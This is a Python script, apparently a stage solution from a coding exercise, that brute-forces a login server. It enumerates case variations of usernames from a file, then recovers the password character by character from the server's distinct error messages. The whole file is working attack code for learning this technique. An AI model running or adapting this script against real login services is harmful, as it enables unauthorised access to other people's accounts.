# ------------------- STAGE 4/5 ------------------- #

import socket
import sys
import itertools
import json


# arguments
args = sys.argv
hostname = args[1]
port = int(args[2])
address = (hostname, port)

# Connecting once to the server - opening the gates!
server_socket = socket.socket()
server_socket.connect(address)


# Generator of logins
def login_generator(file):
    with open(file) as logins_list:
        for login in logins_list:
            login = login.strip()  # important !!
            for variation in map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in login))):
                yield variation
                print(variation)


# Instantiating the generator of logins
hack_login = login_generator(file="logins.txt")


correct_login = ''
# trying to find the `login`
for attempt in hack_login:
    # preparing message to be sent in json
    message = json.dumps({"login": attempt, "password": " "}).encode()
    # sending login guess
    server_socket.send(message)
    # receiving the result from server
    response = json.loads(server_socket.recv(1024).decode())
    print(response)
    if response["result"] == "Wrong password!":
        correct_login = attempt  # our 'login'
        break


# Password decoder Generator
def password_decoder():
    abc = 'abcdefghijklmnopqrstuvwxyz0123456789'
    for digit in abc:
        digit_pairs = itertools.product(*zip(digit.upper(), digit.lower()))
        for dig in digit_pairs:
            yield ''.join(dig)


# For appending digits to the password
piece = ""
while True:
    # Instantiating the password decoder every loop
    hack_password = password_decoder()
    # Now I have the right `LOGIN`, let's then find the right `PASSWORD`!!
    for attempt in hack_password:
        # preparing message to be sent in json
        message = json.dumps({"login": correct_login, "password": piece + attempt}).encode()
        # sending password guess
        server_socket.send(message)
        # receiving the response
        response = json.loads(server_socket.recv(1024).decode())
        if response["result"] == "Exception happened during login":
            piece += attempt
            print(response)
            break
        elif response["result"] == "Connection success!":
            # `password` gets to be `piece + `attempt` because it needs to include
            # the last digit, that will skip the above `if` statement
            # print(response)
            print(json.dumps({"login": correct_login, "password": piece + attempt}))
            server_socket.close()
            exit()




